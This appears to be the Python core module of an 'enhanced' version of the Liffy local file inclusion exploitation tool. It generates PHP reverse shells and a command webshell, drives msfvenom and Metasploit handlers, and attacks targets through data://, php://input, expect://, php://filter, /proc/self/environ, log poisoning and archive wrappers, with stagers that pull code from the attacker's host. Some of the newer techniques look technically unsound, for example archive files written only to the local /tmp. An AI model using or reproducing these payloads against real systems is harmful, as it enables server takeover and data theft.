#!/usr/bin/env python3
"""
Enhanced core module for Liffy with modern Python 3 features
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'

import requests
import base64
import textwrap
import subprocess
import os
import tempfile
import zipfile
import io
from urllib.parse import urlparse, quote_plus
from typing import Optional, Dict, Any, List
import datetime
import threading
import time
import random
import string
from pathlib import Path
import ip_utils

try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

class PayloadGenerator:
    """Enhanced payload generation with multiple types"""
    
    @staticmethod
    def generate_random_name(length: int = 8) -> str:
        """Generate random filename"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    @staticmethod
    def generate_php_shell(lhost: str, lport: int) -> str:
        """Generate PHP reverse shell"""
        return f"""<?php
$sock=fsockopen("{lhost}",{lport});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""
    
    @staticmethod
    def generate_php_meterpreter(lhost: str, lport: int) -> str:
        """Generate PHP Meterpreter payload"""
        return f"""<?php
$lhost="{lhost}";
$lport={lport};
$sock=fsockopen($lhost,$lport);
$proc=proc_open("bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""
    
    @staticmethod
    def generate_webshell() -> str:
        """Generate simple webshell"""
        return """<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>"""

class MSFHandler:
    """Enhanced Metasploit handler management"""
    
    def __init__(self, lhost: str, lport: int, logger, ui):
        self.lhost = lhost
        self.lport = lport
        self.logger = logger
        self.ui = ui
    
    def generate_resource_file(self, shell_name: str) -> str:
        """Generate Metasploit resource file"""
        resource_content = f"""use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST {self.lhost}
set LPORT {self.lport}
set ExitOnSession false
exploit -j
"""
        
        resource_file = f"php_listener_{shell_name}.rc"
        with open(resource_file, 'w') as f:
            f.write(resource_content)
        
        self.ui.info(f"Generated Metasploit resource file: {resource_file}")
        self.ui.info(f"Load Metasploit: msfconsole -r {resource_file}")
        
        return resource_file
    
    def generate_payload(self, shell_name: str) -> str:
        """Generate MSF payload"""
        payload_file = f"/tmp/{shell_name}.php"
        
        try:
            cmd = f"msfvenom -p php/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o {payload_file}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.ui.success(f"Generated payload: {payload_file}")
                return payload_file
            else:
                self.ui.error(f"Failed to generate payload: {result.stderr}")
                return None
        except Exception as e:
            self.ui.error(f"Error generating payload: {str(e)}")
            return None

class BaseExploit:
    """Base class for all exploitation techniques"""
    
    def __init__(self, config, logger, ui):
        self.config = config
        self.logger = logger
        self.ui = ui
        self.session = requests.Session()
        
        if config.user_agent:
            self.session.headers.update({'User-Agent': config.user_agent})
        if config.proxy:
            self.session.proxies.update({'http': config.proxy, 'https': config.proxy})
        
        self.session.timeout = config.timeout
    
    def format_cookies(self, cookies: str) -> Dict[str, str]:
        """Format cookie string into dictionary"""
        if not cookies:
            return {}
        return dict(item.split("=", 1) for item in cookies.split(";") if "=" in item)
    
    def make_request(self, url: str, method: str = "GET", data: Optional[Dict] = None, 
                    headers: Optional[Dict] = None) -> Optional[requests.Response]:
        """Make HTTP request with error handling"""
        try:
            cookies = self.format_cookies(self.config.cookies) if self.config.cookies else None
            
            if method.upper() == "GET":
                response = self.session.get(url, cookies=cookies, headers=headers)
            elif method.upper() == "POST":
                response = self.session.post(url, data=data, cookies=cookies, headers=headers)
            else:
                self.ui.error(f"Unsupported HTTP method: {method}")
                return None
            
            if response.status_code == 200:
                self.ui.success(f"Request successful: {url}")
                return response
            else:
                self.ui.warning(f"Unexpected status code: {response.status_code}")
                return response
                
        except requests.RequestException as e:
            self.ui.error(f"Request failed: {str(e)}")
            return None

class DataEnhanced(BaseExploit):
    """Enhanced data:// technique"""
    
    def execute(self):
        """Execute data:// technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for data technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload = f.read()
        else:
            payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
        
        # Encode payload
        encoded_payload = quote_plus(base64.b64encode(payload.encode()).decode())
        data_wrapper = f"data://text/html;base64,{encoded_payload}"
        lfi_url = self.config.target_url + data_wrapper
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
            # Web server will be started in a separate process
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(lfi_url)
        if response:
            self.ui.success("Data technique executed successfully")

class InputEnhanced(BaseExploit):
    """Enhanced php://input technique"""
    
    def execute(self):
        """Execute php://input technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for input technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload = f.read()
        else:
            payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
        
        # Build URL
        wrapper = "php://input"
        url = self.config.target_url + wrapper
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(url, method="POST", data=payload)
        if response:
            self.ui.success("Input technique executed successfully")

class ExpectEnhanced(BaseExploit):
    """Enhanced expect:// technique"""
    
    def execute(self):
        """Execute expect:// technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for expect technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload_content = f.read()
            payload = f'expect://echo "{quote_plus(payload_content.replace('"', '\\"').replace("$", "\\$"))}" | php'
        else:
            stager_payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
            payload = f'expect://echo "{stager_payload}" | php'
        
        # Build URL
        lfi_url = self.config.target_url + payload
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(lfi_url)
        if response:
            self.ui.success("Expect technique executed successfully")

class FilterEnhanced(BaseExploit):
    """Enhanced php://filter technique"""
    
    def execute(self):
        """Execute php://filter technique"""
        if not hasattr(self.config, 'file') or not self.config.file:
            file_to_read = input("Enter file to read: ")
        else:
            file_to_read = self.config.file
        
        payload = f"php://filter/convert.base64-encode/resource={file_to_read}"
        lfi_url = self.config.target_url + payload
        
        self.ui.info(f"Attempting to read: {file_to_read}")
        
        response = self.make_request(lfi_url)
        if response:
            try:
                decoded_content = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                self.ui.success("File content retrieved successfully:")
                print(t.cyan(textwrap.fill(decoded_content, width=80)))
            except Exception as e:
                self.ui.error(f"Failed to decode content: {str(e)}")
                self.ui.info("Raw response:")
                print(response.text)

class EnvironEnhanced(BaseExploit):
    """Enhanced /proc/self/environ technique"""
    
    def execute(self):
        """Execute /proc/self/environ technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for environ technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload_content = f.read()
            payload = f"<?php eval(base64_decode('{base64.b64encode(payload_content.encode()).decode()}')); ?>"
        else:
            payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
        
        # Build URL
        location = "/proc/self/environ"
        lfi_url = self.config.target_url + location
        
        # Set payload in User-Agent
        headers = {'User-Agent': payload}
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(lfi_url, headers=headers)
        if response:
            self.ui.success("Environ technique executed successfully")

class AccessLogsEnhanced(BaseExploit):
    """Enhanced access log poisoning technique"""
    
    def execute(self):
        """Execute access log poisoning technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for access log technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload_content = f.read()
            payload = f"<?php eval(base64_decode('{base64.b64encode(payload_content.encode()).decode()}')); ?>"
        else:
            payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
        
        # Build URL
        location = self.config.location or "/var/log/apache2/access.log"
        lfi_url = self.config.target_url + location
        
        # Set payload in User-Agent
        headers = {'User-Agent': payload}
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(lfi_url, headers=headers)
        if response:
            self.ui.success("Access log technique executed successfully")
            self.ui.info("Try refreshing your browser if you haven't gotten a shell")

class SSHLogsEnhanced(BaseExploit):
    """Enhanced SSH log poisoning technique"""
    
    def execute(self):
        """Execute SSH log poisoning technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for SSH log technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        payload_file = msf_handler.generate_payload(shell_name)
        if not payload_file:
            return
        
        with open(payload_file, 'r') as f:
            payload_content = f.read()
        
        payload_stage2 = quote_plus(payload_content)
        payload = "<?php eval($_GET['code']); ?>"
        
        self.ui.info("Starting SSH log poisoning...")
        
        # Extract host from target URL
        parsed_url = urlparse(self.config.target_url)
        host = parsed_url.netloc
        
        # Attempt SSH connection with payload
        try:
            subprocess.run(f'ssh "{payload}@{host}"', shell=True, timeout=5)
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            self.ui.warning(f"SSH connection failed: {str(e)}")
        
        self.ui.info("Executing shell!")
        
        # Build URL
        location = self.config.location or "/var/log/auth.log"
        lfi_url = self.config.target_url + location + f"&code={payload_stage2}"
        
        # Execute the attack
        response = self.make_request(lfi_url)
        if response:
            self.ui.success("SSH log technique executed successfully")

class ZipEnhanced(BaseExploit):
    """Enhanced zip:// technique (new)"""
    
    def execute(self):
        """Execute zip:// technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for zip technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload_content = f.read()
        else:
            payload_content = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
        
        # Create ZIP file with payload
        zip_filename = f"/tmp/{shell_name}.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zip_file:
            zip_file.writestr(f"{shell_name}.php", payload_content)
        
        # Build URL
        payload = f"zip://{zip_filename}#{shell_name}.php"
        lfi_url = self.config.target_url + payload
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(lfi_url)
        if response:
            self.ui.success("Zip technique executed successfully")

class PharEnhanced(BaseExploit):
    """Enhanced phar:// technique (new)"""
    
    def execute(self):
        """Execute phar:// technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for phar technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload_content = f.read()
        else:
            payload_content = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
        
        # Create PHAR file with payload
        phar_filename = f"/tmp/{shell_name}.phar"
        with open(phar_filename, 'w') as f:
            f.write(payload_content)
        
        # Build URL
        payload = f"phar://{phar_filename}"
        lfi_url = self.config.target_url + payload
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(lfi_url)
        if response:
            self.ui.success("Phar technique executed successfully")

class CompressEnhanced(BaseExploit):
    """Enhanced compress.zlib:// technique (new)"""
    
    def execute(self):
        """Execute compress.zlib:// technique"""
        if not self.config.lhost or not self.config.lport:
            self.ui.error("LHOST and LPORT are required for compress technique")
            return
        
        # Generate payload
        shell_name = PayloadGenerator.generate_random_name()
        msf_handler = MSFHandler(self.config.lhost, self.config.lport, self.logger, self.ui)
        
        if self.config.nostager:
            payload_file = msf_handler.generate_payload(shell_name)
            if not payload_file:
                return
            
            with open(payload_file, 'r') as f:
                payload_content = f.read()
        else:
            payload_content = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/{shell_name}.php')); ?>"
        
        # Create compressed file with payload
        import zlib
        compressed_filename = f"/tmp/{shell_name}.gz"
        with open(compressed_filename, 'wb') as f:
            f.write(zlib.compress(payload_content.encode()))
        
        # Build URL
        payload = f"compress.zlib://{compressed_filename}"
        lfi_url = self.config.target_url + payload
        
        # Generate MSF resource file
        msf_handler.generate_resource_file(shell_name)
        
        # Start web server if using stager
        if not self.config.nostager:
            self.ui.info("Starting web server...")
            self.ui.progress_bar(2.0, "Starting web server")
        
        self.ui.info("Press Enter when Metasploit handler is running...")
        input()
        
        # Execute the attack
        response = self.make_request(lfi_url)
        if response:
            self.ui.success("Compress technique executed successfully")

class AutoExploit(BaseExploit):
    """Automatic technique detection and exploitation"""
    
    def execute(self):
        """Execute automatic technique detection"""
        self.ui.info("Starting automatic technique detection...")
        
        techniques = [
            ("data://", self._test_data),
            ("php://input", self._test_input),
            ("php://filter", self._test_filter),
            ("expect://", self._test_expect),
            ("zip://", self._test_zip),
            ("phar://", self._test_phar),
            ("compress.zlib://", self._test_compress),
        ]
        
        working_techniques = []
        
        for technique_name, test_func in techniques:
            self.ui.info(f"Testing {technique_name}...")
            if test_func():
                working_techniques.append((technique_name, test_func))
                self.ui.success(f"{technique_name} is working!")
            else:
                self.ui.warning(f"{technique_name} failed")
        
        if working_techniques:
            self.ui.success(f"Found {len(working_techniques)} working techniques")
            # Use the first working technique for exploitation
            technique_name, test_func = working_techniques[0]
            self.ui.info(f"Using {technique_name} for exploitation")
            # Execute the technique
        else:
            self.ui.error("No working techniques found")
    
    def _test_data(self) -> bool:
        """Test data:// technique"""
        test_payload = "data://text/plain,<?php echo 'LFI_TEST_SUCCESS'; ?>"
        response = self.make_request(self.config.target_url + test_payload)
        return response and "LFI_TEST_SUCCESS" in response.text
    
    def _test_input(self) -> bool:
        """Test php://input technique"""
        test_payload = "<?php echo 'LFI_TEST_SUCCESS'; ?>"
        response = self.make_request(self.config.target_url + "php://input", method="POST", data=test_payload)
        return response and "LFI_TEST_SUCCESS" in response.text
    
    def _test_filter(self) -> bool:
        """Test php://filter technique"""
        test_payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
        response = self.make_request(self.config.target_url + test_payload)
        return response and response.status_code == 200
    
    def _test_expect(self) -> bool:
        """Test expect:// technique"""
        test_payload = "expect://echo 'LFI_TEST_SUCCESS'"
        response = self.make_request(self.config.target_url + test_payload)
        return response and "LFI_TEST_SUCCESS" in response.text
    
    def _test_zip(self) -> bool:
        """Test zip:// technique"""
        # Create a test ZIP file
        test_zip = "/tmp/test.zip"
        with zipfile.ZipFile(test_zip, 'w') as zf:
            zf.writestr("test.php", "<?php echo 'LFI_TEST_SUCCESS'; ?>")
        
        test_payload = f"zip://{test_zip}#test.php"
        response = self.make_request(self.config.target_url + test_payload)
        return response and "LFI_TEST_SUCCESS" in response.text
    
    def _test_phar(self) -> bool:
        """Test phar:// technique"""
        # Create a test PHAR file
        test_phar = "/tmp/test.phar"
        with open(test_phar, 'w') as f:
            f.write("<?php echo 'LFI_TEST_SUCCESS'; ?>")
        
        test_payload = f"phar://{test_phar}"
        response = self.make_request(self.config.target_url + test_payload)
        return response and "LFI_TEST_SUCCESS" in response.text
    
    def _test_compress(self) -> bool:
        """Test compress.zlib:// technique"""
        # Create a test compressed file
        import zlib
        test_compress = "/tmp/test.gz"
        with open(test_compress, 'wb') as f:
            f.write(zlib.compress(b"<?php echo 'LFI_TEST_SUCCESS'; ?>"))
        
        test_payload = f"compress.zlib://{test_compress}"
        response = self.make_request(self.config.target_url + test_payload)
        return response and "LFI_TEST_SUCCESS" in response.text
